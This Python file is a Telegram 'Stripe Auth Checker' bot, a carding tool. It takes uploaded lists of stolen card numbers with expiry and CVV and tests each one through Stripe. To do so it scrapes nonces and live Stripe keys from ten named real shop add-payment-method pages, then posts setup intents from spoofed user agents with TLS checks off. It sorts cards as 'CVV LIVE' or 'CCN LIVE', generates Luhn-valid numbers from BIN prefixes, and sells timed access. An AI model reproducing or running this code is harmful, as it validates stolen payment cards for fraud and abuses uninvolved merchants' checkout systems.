import os
import re
import uuid
import time
import logging
import random
import json
import threading
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from concurrent.futures import ThreadPoolExecutor
import urllib3
from datetime import datetime, timedelta
import requests
from fake_useragent import UserAgent
from urllib.parse import urlencode, urljoin

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

#  FIXED: Get tokens from environment variables (SAFE FOR RAILWAY)
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
ADMIN_ID = os.getenv('ADMIN_ID', '6764941964')
LOGS_BOT_TOKEN = os.getenv('LOGS_BOT_TOKEN', '')  # Optional logging bot

# Check if main bot token is loaded
if not BOT_TOKEN:
    logger.error("❌ TELEGRAM_BOT_TOKEN environment variable is not set!")
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is required!")

# List of authorized user IDs
AUTHORIZED_USERS = [
    "6764941964",
]

# File to store rental data
RENTAL_DATA_FILE = "rentals.json"

# BIN API Configuration
BIN_API_URL = "https://isnotsin.com/bin-info/api?bin="

# OPTIMIZED: Better thread pool configuration for Railway
GLOBAL_MAX_WORKERS = 20  # Reduced for Railway
USER_MAX_WORKERS = 2
REQUEST_TIMEOUT = 12
TELEGRAM_TIMEOUT = 8
MAX_CONCURRENT_USERS = 3  # Reduced for Railway

# User info cache
user_info_cache = {}

# Track site errors to avoid spam
site_errors = {}
MAX_ERROR_REPORTS_PER_HOUR = 2

# OPTIMIZED: Global thread pool with better resource management
global_thread_pool = ThreadPoolExecutor(max_workers=GLOBAL_MAX_WORKERS, thread_name_prefix="GlobalWorker")

# User sessions - supports multiple users
user_sessions = {}

# Active user management with better concurrency control
active_users_lock = threading.Lock()
active_users_count = 0

# Initialize fake UserAgent
try:
    ua = UserAgent()
    logger.info("✅ Fake UserAgent initialized successfully")
except Exception as e:
    logger.error(f"❌ Failed to initialize fake UserAgent: {e}")
    ua = None

# Fallback user agents list
FALLBACK_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

# List of target sites (same as your original)
API_URLS = [
    "https://yayfoods.com.au/my-account/add-payment-method/",
    "https://laseraesthetics.co.nz/my-account/add-payment-method/",
    "https://feelforhair.co.uk/my-account/add-payment-method/",
    "https://hartleyknows.com.au/my-account/add-payment-method/",
    "https://totbop.co.uk/my-account/add-payment-method/",
    "https://pacande.com/my-account/add-payment-method/",
    "https://balhambeds.com/my-account/add-payment-method/",
    "https://shackletonsonline.co.uk/my-account/add-payment-method/",
    "https://mobileframing.com.au/my-account/add-payment-method/",
    "https://paulmanwaring.com/my-account/add-payment-method/",
]

# Maximum cards limit
MAX_CARDS_LIMIT = 500  # Reduced for Railway

# Load rental data from file
def load_rental_data():
    try:
        if os.path.exists(RENTAL_DATA_FILE):
            with open(RENTAL_DATA_FILE, 'r') as f:
                data = json.load(f)
                return {user_id: float(expiry) for user_id, expiry in data.items()}
        return {}
    except Exception as e:
        logger.error(f"Error loading rental data: {e}")
        return {}

# Save rental data to file
def save_rental_data():
    try:
        with open(RENTAL_DATA_FILE, 'w') as f:
            data = {user_id: str(expiry) for user_id, expiry in USER_RENTALS.items()}
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving rental data: {e}")

# Rental system - stores user_id: expiry_timestamp
USER_RENTALS = load_rental_data()

# OPTIMIZED: Connection pooling with session reuse
def create_session():
    """Create a requests session with connection pooling"""
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=20,
        pool_maxsize=50,
        max_retries=1,
        pool_block=False
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

# Global session for connection pooling
global_session = create_session()

# UPDATED: Pure results only - only real CVV Live and CCN Live count as live
def parse_stripe_response(response_text):
    resp_lower = response_text.lower()
    
    # ONLY REAL CVV LIVE - Transaction succeeded
    if any(msg in resp_lower for msg in ["succeeded", "payment complete", "setup_intent_succeeded"]):
        return {'status': 'cvv_live', 'rawMessage': 'CVV LIVE: Transaction Succeeded'}
    
    # ONLY REAL CCN LIVE - Wrong CVV but valid card
    if any(msg in resp_lower for msg in ["incorrect_cvc", "security code is incorrect"]):
        return {'status': 'ccn_live', 'rawMessage': 'CCN LIVE: Incorrect CVC'}
    
    # EVERYTHING ELSE IS DECLINED
    if any(msg in resp_lower for msg in ["insufficient_funds", "3ds", "authentication", "otp", "verification", "challenge"]):
        return {'status': 'declined', 'rawMessage': 'Declined'}
    
    if any(msg in resp_lower for msg in ["address_zip_check", "postal_code_invalid"]):
        return {'status': 'declined', 'rawMessage': 'Declined: AVS Mismatch'}
    
    if any(msg in resp_lower for msg in ["card_declined", "declined", "do_not_honor", "do not honor", "not honored"]):
        return {'status': 'declined', 'rawMessage': 'Declined: Card declined'}
    
    if any(msg in resp_lower for msg in ["invalid_number", "invalid card", "incorrect_number"]):
        return {'status': 'declined', 'rawMessage': 'Declined: Invalid card number'}
    
    if any(msg in resp_lower for msg in ["expired_card", "expired"]):
        return {'status': 'declined', 'rawMessage': 'Declined: Card expired'}
    
    # DEFAULT TO DECLINED
    return {'status': 'declined', 'rawMessage': 'Declined: No positive indicators'}

def fetch_nonce_and_key(url):
    try:
        headers = {
            'User-Agent': random.choice(FALLBACK_USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        res = global_session.get(url, headers=headers, timeout=10)
        res.raise_for_status()
        html = res.text
        nonce_match = (re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html) or 
                      re.search(r'"_ajax_nonce":"([a-f0-9]{10,})"', html) or 
                      re.search(r'name="woocommerce-process-checkout-nonce" value="([a-f0-9]{10,})"', html))
        key_match = re.search(r'(pk_live_[A-Za-z0-9_]+)', html)
        nonce = nonce_match.group(1) if nonce_match else None
        key = key_match.group(1) if key_match else None
        
        return {'nonce': nonce, 'key': key}
    except Exception as e:
        logger.error(f"Error fetching nonce/key from {url}: {e}")
        return {'nonce': None, 'key': None}

def generate_uuids():
    return {"gu": str(uuid.uuid4()), "mu": str(uuid.uuid4()), "si": str(uuid.uuid4())}

def prepare_headers():
    """Generate random user agent"""
    try:
        if ua is not None:
            user_agent = ua.random
        else:
            user_agent = random.choice(FALLBACK_USER_AGENTS)
    except Exception as e:
        user_agent = random.choice(FALLBACK_USER_AGENTS)
    
    return {
        'user-agent': user_agent,
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'accept-language': 'en-US,en;q=0.9',
    }

# OPTIMIZED: Faster BIN lookup
def fetch_bin_info(card_number):
    """Fetch BIN info from API"""
    try:
        bin_number = card_number[:6]
        response = global_session.get(f"{BIN_API_URL}{bin_number}", timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            return {
                "BIN": data.get('bin', bin_number),
                "Brand": data.get('brand', 'UNKNOWN').upper(),
                "Type": data.get('type', 'UNKNOWN').upper(),
                "Level": data.get('level', 'UNKNOWN').upper(),
                "Bank": data.get('bank', 'UNKNOWN BANK'),
                "Country": data.get('country', 'UNKNOWN COUNTRY'),
            }
    except Exception as e:
        logger.error(f"Error fetching BIN info: {e}")
    
    return {
        "BIN": card_number[:6],
        "Brand": "UNKNOWN",
        "Type": "UNKNOWN", 
        "Level": "UNKNOWN",
        "Bank": "UNKNOWN BANK",
        "Country": "UNKNOWN COUNTRY",
    }

def send_telegram_message_sync(message, chat_id, parse_mode='HTML', reply_markup=None):
    """Sync version of telegram message sending"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': parse_mode
        }
        if reply_markup:
            params['reply_markup'] = reply_markup.to_json()
        response = global_session.post(url, json=params, timeout=TELEGRAM_TIMEOUT)
        return response
    except Exception as e:
        logger.error(f"Error sending message: {e}")
        return None

def edit_telegram_message_sync(message, chat_id, message_id, parse_mode='HTML', reply_markup=None):
    """Sync version of telegram message editing"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        params = {
            'chat_id': chat_id,
            'message_id': message_id,
            'text': message,
            'parse_mode': parse_mode
        }
        if reply_markup:
            params['reply_markup'] = reply_markup.to_json()
        response = global_session.post(url, json=params, timeout=TELEGRAM_TIMEOUT)
        return response
    except Exception as e:
        logger.error(f"Error editing message: {e}")
        return None

# MODIFIED: Build keyboard
def build_keyboard(task_id, counts, current_card_info):
    """Builds the inline keyboard for the mass check UI."""
    status = counts.get('status', 'Running')
    
    if status == 'Completed':
        status_text = f"✅ {status}"
    elif status == 'Stopped':
        status_text = f"🛑 {status}"
    else:
        status_text = f"🔄 {status}"
    
    buttons = [
        [InlineKeyboardButton(f"• {status_text}", callback_data='noop')],
        [InlineKeyboardButton(f"🟢 CVV LIVE → [ {counts['cvv_live']} ]", callback_data='noop')],
        [InlineKeyboardButton(f"🔵 CCN LIVE → [ {counts['ccn_live']} ]", callback_data='noop')],
        [InlineKeyboardButton(f"❌ DECLINED → [ {counts['declined']} ]", callback_data='noop')],
        [InlineKeyboardButton(f"🔄 TOTAL → [ {counts['total']} ]", callback_data='noop')],
        [InlineKeyboardButton(" [ STOP ] ", callback_data=f'stop_masschk_{task_id}')]
    ]
    
    if current_card_info and status == 'Running':
        card_display = current_card_info.get('display', '')
        if card_display:
            buttons.insert(1, [InlineKeyboardButton(f" {card_display}", callback_data='noop')])
    
    return InlineKeyboardMarkup(buttons)

def format_card_display(card, current_index, total_cards):
    """Format card display in x/y - card details format"""
    try:
        card_parts = card.split('|')
        if len(card_parts) >= 4:
            number = card_parts[0]
            exp_month = card_parts[1]
            exp_year = card_parts[2]
            cvv = card_parts[3]
            return f"{current_index}/{total_cards} - {number}|{exp_month}|{exp_year}|{cvv}"
    except:
        pass
    return f"{current_index}/{total_cards} - {card}"

def update_progress_message_sync(user_session):
    if not user_session["checking"]:
        return
    
    try:
        stats = user_session["stats"]
        current = user_session["current_index"]
        total = user_session["stats"]["total"]
        chat_id = user_session["chat_id"]
        task_id = user_session["task_id"]
        
        current_card_info = None
        if user_session["current_card_info"]:
            current_card = user_session["current_card_info"]["card"]
            current_card_info = {
                "display": format_card_display(current_card, current, total)
            }
        
        counts = {
            'status': 'Running',
            'cvv_live': stats['cvv_live'],
            'ccn_live': stats['ccn_live'],
            'declined': stats['declined'],
            'total': total,
            'current': current
        }
        
        progress_percentage = (current / total) * 100 if total > 0 else 0
        progress_message = f"🔄 Processing... {current}/{total} ({progress_percentage:.1f}%)"
        
        if user_session["message_id"]:
            response = edit_telegram_message_sync(
                progress_message, 
                chat_id, 
                user_session["message_id"],
                reply_markup=build_keyboard(task_id, counts, current_card_info)
            )
            if response and response.status_code != 200:
                response = send_telegram_message_sync(
                    progress_message, 
                    chat_id,
                    reply_markup=build_keyboard(task_id, counts, current_card_info)
                )
                if response and response.status_code == 200:
                    data = response.json()
                    user_session["message_id"] = data['result']['message_id']
        else:
            response = send_telegram_message_sync(
                progress_message, 
                chat_id,
                reply_markup=build_keyboard(task_id, counts, current_card_info)
            )
            if response and response.status_code == 200:
                data = response.json()
                user_session["message_id"] = data['result']['message_id']
    except Exception as e:
        logger.error(f"Error updating progress: {e}")

def send_final_results_sync(user_session):
    try:
        stats = user_session["stats"]
        total = stats["total"]
        chat_id = user_session["chat_id"]
        task_id = user_session["task_id"]
        
        final_counts = {
            'status': 'Completed',
            'cvv_live': stats['cvv_live'],
            'ccn_live': stats['ccn_live'],
            'declined': stats['declined'],
            'total': total,
            'current': total
        }
        
        final_message = "✅ Processing Completed"
        
        if user_session["message_id"]:
            edit_telegram_message_sync(
                final_message, 
                chat_id, 
                user_session["message_id"],
                reply_markup=build_keyboard(task_id, final_counts, None)
            )
        else:
            send_telegram_message_sync(
                final_message, 
                chat_id,
                reply_markup=build_keyboard(task_id, final_counts, None)
            )
    except Exception as e:
        logger.error(f"Error sending final results: {e}")

# OPTIMIZED: Card processing function
def process_single_card(card, user_session, worker_id):
    """Process a single card"""
    if not user_session["checking"]:
        return None
    
    try:
        user_session["current_card_info"] = {"card": card}
        
        # Parse card details
        try:
            card_parts = card.split('|')
            if len(card_parts) < 4:
                user_session["stats"]["declined"] += 1
                user_session["current_index"] += 1
                return None
                
            number, exp_month, exp_year, cvv = card_parts[:4]
            exp_year = exp_year[-2:] if len(exp_year) > 2 else exp_year
        except:
            user_session["stats"]["declined"] += 1
            user_session["current_index"] += 1
            return None

        # Get site and nonce/key
        site_url = random.choice(API_URLS)
        result = fetch_nonce_and_key(site_url)
        nonce = result['nonce']
        key = result['key']
        
        if not nonce or not key:
            user_session["stats"]["declined"] += 1
            user_session["current_index"] += 1
            return None
            
        # Prepare Stripe data
        uuids = generate_uuids()
        headers = prepare_headers()
        stripe_data = {
            'type': 'card',
            'card[number]': number,
            'card[cvc]': cvv,
            'card[exp_year]': exp_year,
            'card[exp_month]': exp_month,
            'guid': uuids["gu"],
            'muid': uuids["mu"],
            'sid': uuids["si"],
            'key': key,
            '_stripe_version': '2024-06-20',
        }
        
        # Get payment method ID from Stripe
        try:
            stripe_response = global_session.post(
                "https://api.stripe.com/v1/payment_methods", 
                headers=headers, 
                data=stripe_data, 
                verify=False, 
                timeout=REQUEST_TIMEOUT
            )
            
            if stripe_response.status_code == 200:
                stripe_data_response = stripe_response.json()
                payment_method_id = stripe_data_response.get('id')
                
                # Check for Stripe-level errors
                if stripe_data_response.get('error'):
                    error_code = stripe_data_response['error'].get('code', '')
                    
                    if error_code in ['invalid_number', 'incorrect_number']:
                        user_session["stats"]["declined"] += 1
                        user_session["current_index"] += 1
                        return None
                    elif error_code in ['invalid_cvc', 'incorrect_cvc']:
                        user_session["stats"]["ccn_live"] += 1
                        user_session["current_index"] += 1
                        return {'card': card, 'status': 'ccn_live', 'message': 'CCN LIVE: Incorrect CVC'}
                    elif error_code in ['expired_card', 'card_declined']:
                        user_session["stats"]["declined"] += 1
                        user_session["current_index"] += 1
                        return None
                    else:
                        user_session["stats"]["declined"] += 1
                        user_session["current_index"] += 1
                        return None
                
                if not payment_method_id:
                    user_session["stats"]["declined"] += 1
                    user_session["current_index"] += 1
                    return None
            else:
                user_session["stats"]["declined"] += 1
                user_session["current_index"] += 1
                return None
                
        except Exception as e:
            user_session["stats"]["declined"] += 1
            user_session["current_index"] += 1
            return None

        # Prepare setup data
        setup_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }
        
        # Confirm setup intent
        try:
            confirm_response = global_session.post(
                site_url, 
                params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, 
                headers=headers, 
                data=setup_data, 
                verify=False, 
                timeout=REQUEST_TIMEOUT
            )
            if confirm_response.status_code == 200:
                response_text = confirm_response.text
                result = parse_stripe_response(response_text)
                
                if result['status'] == 'cvv_live':
                    user_session["stats"]["cvv_live"] += 1
                    return {'card': card, 'status': 'cvv_live', 'message': result['rawMessage']}
                elif result['status'] == 'ccn_live':
                    user_session["stats"]["ccn_live"] += 1
                    return {'card': card, 'status': 'ccn_live', 'message': result['rawMessage']}
                else:
                    user_session["stats"]["declined"] += 1
            else:
                user_session["stats"]["declined"] += 1
                
        except Exception as e:
            user_session["stats"]["declined"] += 1
            
    except Exception as e:
        user_session["stats"]["declined"] += 1
    
    user_session["current_index"] += 1
    user_session["current_card_info"] = None
    return None

# OPTIMIZED: Checking thread for Railway
def checking_thread(user_session):
    """Optimized checking thread for Railway"""
    try:
        # Mark user as active
        with active_users_lock:
            global active_users_count
            active_users_count += 1
            user_session["active"] = True
            logger.info(f"User {user_session['chat_id']} started checking. Active users: {active_users_count}")
        
        # Send initial progress update
        update_progress_message_sync(user_session)
        
        cards = user_session["cards"]
        total_cards = len(cards)
        approved_cards = []
        
        # Process cards in batches to avoid overwhelming Railway
        batch_size = 5
        for i in range(0, total_cards, batch_size):
            if not user_session["checking"]:
                break
                
            batch = cards[i:i + batch_size]
            futures = []
            
            # Submit batch to thread pool
            for card in batch:
                if not user_session["checking"]:
                    break
                future = global_thread_pool.submit(process_single_card, card, user_session, i)
                futures.append(future)
            
            # Wait for batch completion
            for future in futures:
                if not user_session["checking"]:
                    break
                try:
                    result = future.result(timeout=15)
                    if result:
                        approved_cards.append(result)
                except Exception as e:
                    user_session["stats"]["declined"] += 1
                    user_session["current_index"] += 1
            
            # Update progress after each batch
            update_progress_message_sync(user_session)
            time.sleep(0.5)  # Small delay between batches
        
        # Send final results
        if user_session["checking"]:
            update_progress_message_sync(user_session)
            send_final_results_sync(user_session)
            
            # Save approved cards to file
            if approved_cards:
                try:
                    chat_id = user_session["chat_id"]
                    filename = f"results_{chat_id}.txt"
                    with open(filename, 'w') as f:
                        f.write("APPROVED CARDS RESULTS\n")
                        f.write("=" * 50 + "\n")
                        f.write(f"Total Approved: {len(approved_cards)}\n")
                        f.write(f"CVV Live: {sum(1 for card in approved_cards if card['status'] == 'cvv_live')}\n")
                        f.write(f"CCN Live: {sum(1 for card in approved_cards if card['status'] == 'ccn_live')}\n")
                        f.write("=" * 50 + "\n\n")
                        
                        for card_info in approved_cards:
                            card = card_info['card']
                            status = card_info['status']
                            status_label = 'CVV LIVE' if status == 'cvv_live' else 'CCN LIVE'
                            f.write(f"{card} | {status_label}\n")
                    
                    # Send file
                    try:
                        with open(filename, 'rb') as f:
                            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                            files = {'document': (filename, f)}
                            data = {
                                'chat_id': chat_id,
                                'caption': f"✅ Approved Cards: {len(approved_cards)}"
                            }
                            global_session.post(url, files=files, data=data, timeout=TELEGRAM_TIMEOUT)
                        
                        # Clean up
                        os.remove(filename)
                    except Exception as file_error:
                        logger.error(f"Error sending approved cards file: {file_error}")
                except Exception as e:
                    logger.error(f"Error saving approved cards: {e}")
                    
    except Exception as e:
        logger.error(f"Error in checking_thread: {e}")
    finally:
        # Mark user as inactive
        with active_users_lock:
            active_users_count -= 1
            user_session["active"] = False
            user_session["checking"] = False

# Luhn algorithm functions (same as your original)
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0

def calculate_luhn_check_digit(partial_card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(partial_card_number + '0')
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return (10 - (checksum % 10)) % 10

def generate_valid_card(custom_prefix, length=16):
    custom_prefix = custom_prefix.replace(' ', '').replace('-', '')
    remaining_length = length - len(custom_prefix) - 1
    if remaining_length < 0:
        raise ValueError("Custom prefix too long")
    middle_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
    partial_card = custom_prefix + middle_digits
    check_digit = calculate_luhn_check_digit(partial_card)
    return partial_card + str(check_digit)

def generate_cards(custom_prefix, count=10, length=16):
    cards = []
    for _ in range(count):
        try:
            card_number = generate_valid_card(custom_prefix, length)
            if is_luhn_valid(card_number):
                cards.append(card_number)
        except ValueError:
            continue
    return cards

def generate_random_expiry():
    month = random.randint(1, 12)
    month_str = f"{month:02d}"
    current_year = datetime.now().year
    year = random.randint(current_year, current_year + 5)
    year_str_4d = str(year)
    year_str_2d = str(year)[-2:]
    return month_str, year_str_4d, year_str_2d

# User session management
def get_user_session(chat_id):
    if chat_id not in user_sessions:
        user_sessions[chat_id] = {
            "checking": False,
            "cards": [],
            "current_index": 0,
            "stats": {"cvv_live": 0, "ccn_live": 0, "declined": 0, "total": 0},
            "start_time": None,
            "message_id": None,
            "chat_id": chat_id,
            "current_card_info": None,
            "task_id": str(uuid.uuid4())[:8],
            "active": False
        }
    return user_sessions[chat_id]

def can_accept_new_user():
    with active_users_lock:
        return active_users_count < MAX_CONCURRENT_USERS

def is_authorized(user_id):
    user_id_str = str(user_id)
    if user_id_str in AUTHORIZED_USERS:
        return True
    if user_id_str in USER_RENTALS:
        expiry_time = USER_RENTALS[user_id_str]
        if datetime.now().timestamp() < expiry_time:
            return True
        else:
            del USER_RENTALS[user_id_str]
            save_rental_data()
    return False

def is_admin(user_id):
    return str(user_id) == ADMIN_ID

# Telegram command handlers
async def safe_send_message(update: Update, text: str, parse_mode='HTML', reply_markup=None):
    try:
        await update.message.reply_text(text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        logger.error(f"Error sending message: {e}")

async def check_access(update: Update):
    user_id = str(update.effective_user.id)
    if not is_authorized(user_id):
        await safe_send_message(
            update,
            "🚫 <b>Access Denied</b>\n\n"
            "You are not authorized to use this bot.\n\n"
            "Contact admin for access."
        )
        return False
    return True

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_send_message(
        update,
        "🤖 <b>Mang Biroy AUTH</b>\n\n"
        "📁 <b>Send cc.txt file with cards to check.</b>\n\n"
        "Format:\n<code>card|mm|yy|cvv</code>\n\n"
        "Use /cmds to see all commands\n"
        "DM @mcchiatoos for any problem"
    )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    if user_session["checking"]:
        user_session["checking"] = False
        await safe_send_message(update, "🛑 Checking stopped!")
    else:
        await safe_send_message(update, "❌ No active checking session!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    if user_session["checking"]:
        stats = user_session["stats"]
        current = user_session["current_index"]
        total = stats["total"]
        await safe_send_message(
            update,
            f" <b>Current Stats</b>\n\n"
            f"✅ CVV Live: {stats['cvv_live']}\n"
            f"✅ CCN Live: {stats['ccn_live']}\n"
            f"❌ Declined: {stats['declined']}\n"
            f"🔄 Progress: {current}/{total}\n"
            f" Total: {total}"
        )
    else:
        await safe_send_message(update, "❌ No active checking session!")

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if is_authorized(user_id):
        await safe_send_message(update, "✅ <b>You have access to this bot!</b>")
    else:
        await safe_send_message(update, "❌ <b>You don't have access to this bot.</b>")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    if user_session["checking"]:
        await safe_send_message(update, "❌ Please stop current checking first using /stop")
        return
    document = update.message.document
    if document.file_name.endswith('.txt'):
        file = await context.bot.get_file(document.file_id)
        file_path = f"cc_{chat_id}.txt"
        await file.download_to_drive(file_path)
        await safe_send_message(update, f"✅ File received: {document.file_name}")
    else:
        await safe_send_message(update, "❌ Please upload a .txt file")

async def start_checking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    if user_session["checking"]:
        await safe_send_message(update, "❌ You already have a checking session in progress! Use /stop to stop first.")
        return
    if not can_accept_new_user():
        await safe_send_message(update, "🚫 <b>System Busy</b>\n\nToo many users are currently checking cards.")
        return
    user_file = f"cc_{chat_id}.txt"
    if not os.path.exists(user_file):
        await safe_send_message(update, "📁 <b>Send cc.txt file with cards to check.</b>")
        return
    try:
        with open(user_file, 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
    except Exception as e:
        await safe_send_message(update, "❌ Error reading your card file!")
        return
    if not cards:
        await safe_send_message(update, "❌ No cards found in your file!")
        return
    if len(cards) > MAX_CARDS_LIMIT:
        cards = cards[:MAX_CARDS_LIMIT]
        await safe_send_message(update, f"⚠️ <b>Maximum card limit applied!</b>\n\nOnly the first {MAX_CARDS_LIMIT} cards will be checked.")
    user_session.update({
        "checking": True,
        "cards": cards,
        "current_index": 0,
        "stats": {"cvv_live": 0, "ccn_live": 0, "declined": 0, "total": len(cards)},
        "start_time": time.time(),
        "message_id": None,
        "chat_id": chat_id,
        "current_card_info": None,
        "task_id": str(uuid.uuid4())[:8],
        "active": False
    })
    initial_counts = {
        'status': 'Starting...',
        'cvv_live': 0,
        'ccn_live': 0,
        'declined': 0,
        'total': len(cards),
        'current': 0
    }
    response = send_telegram_message_sync(
        "🔄 Processing...", 
        chat_id,
        reply_markup=build_keyboard(user_session["task_id"], initial_counts, None)
    )
    if response and response.status_code == 200:
        data = response.json()
        user_session["message_id"] = data['result']['message_id']
    future = global_thread_pool.submit(checking_thread, user_session)
    await safe_send_message(update, f"✅ Checking started! Processing {len(cards)} cards.")

async def handle_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    callback_data = query.data
    if callback_data.startswith('stop_masschk_'):
        task_id = callback_data.replace('stop_masschk_', '')
        for chat_id, session in user_sessions.items():
            if session.get('task_id') == task_id:
                if session["checking"]:
                    session["checking"] = False
                    stats = session["stats"]
                    total = stats["total"]
                    final_counts = {
                        'status': 'Stopped',
                        'cvv_live': stats['cvv_live'],
                        'ccn_live': stats['ccn_live'],
                        'declined': stats['declined'],
                        'total': total,
                        'current': session["current_index"]
                    }
                    stopped_message = "🛑 Processing Stopped"
                    await query.edit_message_text(
                        text=stopped_message,
                        parse_mode='HTML',
                        reply_markup=build_keyboard(task_id, final_counts, session.get("current_card_info"))
                    )
                    return
        await query.answer("Session not found!", show_alert=True)

async def handle_noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling an update:", exc_info=context.error)

def main():
    """Main function to run the bot on Railway"""
    logger.info("🤖 Multi-User Stripe Auth Checker Bot Starting on Railway...")
    logger.info(f"✅ Authorized users: {AUTHORIZED_USERS}")
    logger.info(f"📊 Maximum cards per check: {MAX_CARDS_LIMIT}")
    logger.info(f"⚙️ Global thread pool workers: {GLOBAL_MAX_WORKERS}")
    logger.info(f"👥 Max concurrent users: {MAX_CONCURRENT_USERS}")
    
    if not BOT_TOKEN:
        logger.error("❌ TELEGRAM_BOT_TOKEN environment variable is not set!")
        return
    
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        application.add_error_handler(error_handler)
        
        # Add handlers
        application.add_handler(CommandHandler("start", start_checking))
        application.add_handler(CommandHandler("stop", stop_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("myaccess", myaccess_command))
        application.add_handler(CommandHandler("cmds", start_command))
        application.add_handler(CommandHandler("help", start_command))
        
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start_command))
        
        application.add_handler(CallbackQueryHandler(handle_stop_callback, pattern=r'^stop_masschk_'))
        application.add_handler(CallbackQueryHandler(handle_noop_callback, pattern=r'^noop$'))
        
        logger.info("✅ Bot is running on Railway with full functionality...")
        application.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES,
            poll_interval=1.0,
            timeout=20
        )
        
    except Exception as e:
        logger.error(f"Bot crashed with error: {e}")
        logger.info("🔄 Restarting bot in 5 seconds...")
        time.sleep(5)

if __name__ == "__main__":
    main()